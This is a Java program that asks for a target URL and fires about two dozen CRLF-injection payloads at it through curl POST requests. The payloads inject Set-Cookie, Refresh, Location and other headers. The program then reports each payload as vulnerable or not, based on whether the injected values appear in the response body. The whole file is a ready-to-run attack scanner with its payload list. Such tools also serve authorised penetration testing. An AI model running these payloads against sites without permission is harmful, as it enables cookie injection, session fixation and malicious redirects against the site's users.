import java.util.Scanner;
import java.io.InputStreamReader;
import java.io.BufferedReader;
import java.io.IOException;

public class CRLFinjection {
    public static void main(String[] args) throws IOException {
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter your target URL: ");
        String targetURL = scanner.nextLine();
        scanner.close();

        String[] payloads = {
            // Existing payloads
            "username=test%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A&password=test",
            "username=test%0D%0AContent-Length:%200%0D%0A&password=test",
            "username=test%0D%0ARefresh:%200%0D%0A&password=test",
            "username=test%0D%0ALocation:%20https://www.bbc.com%0D%0A&password=test",
            "User-Agent:%20Malicious%0D%0Ausername=test&password=test",
            "Referer:%20https://www.bbc.com%0D%0Ausername=test&password=test",
            "Proxy:%20https://www.bbc.com%0D%0Ausername=test&password=test",
            "Set-Cookie2:%20maliciousCookie=maliciousValue%0D%0Ausername=test&password=test",
            "CustomHeader:%20Injection%0D%0Ausername=test&password=test",
            "POST /login%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0A%0D%0A",
            "POST /login HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0A",
            "Content-Type: text/html%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",
            "<!--%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A-->",
            // Additional payloads
            // Add more payloads here
            // Example payloads for additional testing
            "Accept-Encoding: gzip%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",
            "If-Modified-Since: Mon, 29 Feb 2024 00:00:00 GMT%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",
            "ETag: \"12345\"%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",
            "Accept-Language: en-US%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",
            // Additional payloads for testing
            "X-Forwarded-For: 127.0.0.1%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",
            "Host: example.com%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",
            "Content-Disposition: attachment; filename=\"maliciousFile.txt\"%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",
            "X-HTTP-Method-Override: PUT%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",
            "Authorization: Basic YWRtaW46cGFzc3dvcmQ=%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test"
        };

        for (String payload : payloads) {
            testCrlfInjection(payload, targetURL);
        }
    }

    public static void testCrlfInjection(String payload, String targetURL) throws IOException {
        String urlString = targetURL;
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("curl", "-s", "-X", "POST", "-d", payload, urlString);
        Process process = processBuilder.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            response.append(line).append("\n");
        }
        reader.close();
        String responseBody = response.toString();
        if (responseBody.contains("maliciousCookie=maliciousValue") || responseBody.contains("Refresh: 0") ||
                responseBody.contains("Content-Length: 0") || responseBody.contains("Location: https://www.bbc.com")) {
            System.out.println("Vulnerable to CRLF Injection: " + payload);
        } else {
            System.out.println("Not vulnerable to CRLF Injection: " + payload);
        }
    }
}
